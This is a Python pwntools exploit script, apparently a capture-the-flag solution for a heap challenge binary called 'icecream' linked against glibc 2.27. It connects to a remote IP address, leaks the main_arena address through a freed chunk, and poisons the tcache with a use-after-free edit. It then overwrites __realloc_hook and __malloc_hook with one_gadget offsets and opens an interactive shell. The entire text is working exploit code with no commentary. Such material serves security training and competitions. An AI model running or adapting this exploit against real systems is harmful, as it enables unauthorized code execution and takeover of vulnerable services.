from pwn import *

context(arch = "amd64", os = "linux", log_level = "Info")
io = process("./icecream")
io = remote("119.45.112.147", 20001)
e = ELF("./libc-2.27.so")
#gdb.attach(io)

def add(size):
    io.recvuntil("exit")
    io.sendline("1")
    io.recvuntil("buy?")
    io.sendline(str(size))
    
def delete(idx):
    io.recvuntil("exit")
    io.sendline("2")
    io.recvuntil("delete?")
    io.sendline(str(idx))
    
def view(idx):
    io.recvuntil("exit")
    io.sendline("3")
    io.recvuntil("view?")
    io.sendline(str(idx))
    io.recvline()
    
def edit(idx, string):
    io.recvuntil("exit")
    io.sendline("4")
    io.recvuntil("edit?")
    io.sendline(str(idx))
    io.recvuntil("byte")
    io.sendline(string)
    
for i in range(10):
    add(200)

for i in range(10):
    delete(i)

view(7)
main_arena_addr = u64(io.recv()[:6].ljust(8, '\0')) - 96
realloc_hook = main_arena_addr - 0x18
log.info("main arena address is: " + hex(main_arena_addr))
log.info("Realloc_hook address is: " + hex(realloc_hook))
payload = p64(realloc_hook)
#add(32) --> idx = 10
io.sendline("1")
io.recvuntil("buy?")
io.sendline(str(32))

delete(10)
edit(10,payload)

add(32)
add(32)

payload = p64(realloc_hook - 0x3EBC28 + 0x4f432)  #realloc hook --> one_gadget
payload += p64(realloc_hook - 0x3EBC28 + 0x98D72) #malloc hook --> realloc

edit(12, payload)
add(32)
# io.recvall()
io.interactive()
